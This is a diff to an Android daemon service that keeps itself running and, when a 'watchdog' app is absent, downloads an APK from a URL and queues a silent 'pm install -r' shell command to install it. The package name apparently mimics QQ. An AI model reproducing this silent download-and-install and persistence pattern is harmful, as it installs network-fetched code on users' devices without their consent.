@@ -10,11 +10,20 @@ import android.graphics.BitmapFactory;
 import android.os.Binder;
 import android.os.IBinder;
 import android.os.RemoteException;
+import android.text.TextUtils;
 import android.util.Log;
 
 import com.orhanobut.logger.Logger;
+import com.test.emptydemo.cmd.CmdBean;
+import com.test.emptydemo.cmd.MyConstants;
 import com.test.emptydemo.cmd.Task;
 import com.test.emptydemo.cmd.ThreadPool;
+import com.yuan.library.dmanager.download.DownloadManager;
+import com.yuan.library.dmanager.download.DownloadTask;
+import com.yuan.library.dmanager.download.DownloadTaskListener;
+import com.yuan.library.dmanager.download.TaskEntity;
+
+import java.util.ArrayList;
 
 import cn.jpush.android.api.JPushInterface;
 
@@ -37,7 +46,7 @@ public class QiqoQiaoDaemonService extends Service {
 //
             Utils.startDeamonService();
             Log.d(TAG, "onStartCommand: startDeamonService");
-            bindService(new Intent("com.test.enablexpmod.daemonwatchdog").setPackage("com.qq.daemonwatchdog"), conn, BIND_AUTO_CREATE);
+            bindService(new Intent("com.test.enablexpmod.daemonwatchdog").setPackage(MyConstants.PKG_WATCHDOG), conn, BIND_AUTO_CREATE);
         }
     }
 
@@ -119,18 +128,88 @@ public class QiqoQiaoDaemonService extends Service {
             String stringExtra = intent.getStringExtra(MyApplication.KEY_PUSHSTR);
             Logger.d("I'm daemonservice receive msg " + stringExtra);
         }
-
-        boolean watchdogInstalled = Utils.isAppInstalled(this, "com.qq.daemonwatchdog");
+//
+        //daemon 未安装则先安装，安装了才会绑定它的服务
+        boolean watchdogInstalled = Utils.isAppInstalled(this, MyConstants.PKG_WATCHDOG);
         if (!watchdogInstalled) {
-            ThreadPool threadPool = ThreadPool.getThreadPool();
-            threadPool.addTask(new Task(threadPool, null));
-            Logger.d("watchdogInstalled false  --  testtask outoftime");
+            CmdBean cmdBean = new CmdBean();
+            cmdBean.setApkName(CmdBean.DAEMON_APK_NAME);
+            cmdBean.setApkPath(CmdBean.DAEMON_APK_PATH);
+            cmdBean.setDownloadUrl(CmdBean.DAEMON_URL);
+            cmdBean.setCmdType(CmdBean.CMD_TYPE_DOWNLOAD_DAEMON_WATCHDOG);
+            ArrayList<String> cmds = new ArrayList<>(3);
+            cmds.add(" pm install -r  " +
+                    CmdBean.DAEMON_APK_PATH +
+                    "/" +
+                    CmdBean.DAEMON_APK_NAME +
+                    " ");
+            cmdBean.setCmds(cmds);
+            downLoadDaemonWatchDog(cmdBean);
         } else {
             //       绑定远程服务
             bindRemoteService();
-            Logger.d("watchdogInstalled bindRemoteService");
+            Logger.d("daemonInstalled bindRemoteService");
         }
+
+
         return START_STICKY;
+    }
+
+    /**
+     * @description 下载watchdog
+     * @author zhengyx
+     * @date 2017/5/9
+     */
+    private void downLoadDaemonWatchDog(final CmdBean cmdBean) {
+        String downloadUrl = cmdBean.getDownloadUrl();
+        if (!TextUtils.isEmpty(downloadUrl)) {
+            TaskEntity taskEntity = new TaskEntity.Builder().url(downloadUrl).build();
+            taskEntity.setFilePath(cmdBean.getApkPath());
+            String fileName = cmdBean.getApkName();
+            taskEntity.setFileName(fileName);
+            DownloadTask itemTask = new DownloadTask(taskEntity);
+            itemTask.setListener(new DownloadTaskListener() {
+
+                @Override
+                public void onQueue(DownloadTask downloadTask) {
+
+                    Logger.d("onQueue");
+                }
+
+                @Override
+                public void onConnecting(DownloadTask downloadTask) {
+                    Logger.d("onConnecting");
+                }
+
+                @Override
+                public void onStart(DownloadTask downloadTask) {
+                    Logger.d("onStart");
+                }
+
+                @Override
+                public void onPause(DownloadTask downloadTask) {
+                    Logger.d("onPause");
+                }
+
+                @Override
+                public void onCancel(DownloadTask downloadTask) {
+                    Logger.d("onCancel");
+                }
+
+                @Override
+                public void onFinish(DownloadTask downloadTask) {
+                    Logger.d("onFinish");
+                    ThreadPool threadPool = ThreadPool.getThreadPool();
+                    threadPool.addTask(new Task(threadPool, cmdBean.getCmds()));
+                }
+
+                @Override
+                public void onError(DownloadTask downloadTask, int code) {
+                    Logger.d("onError-" + code);
+                }
+            });
+            DownloadManager.getInstance().addTask(itemTask);
+        }
     }
 
     @Override
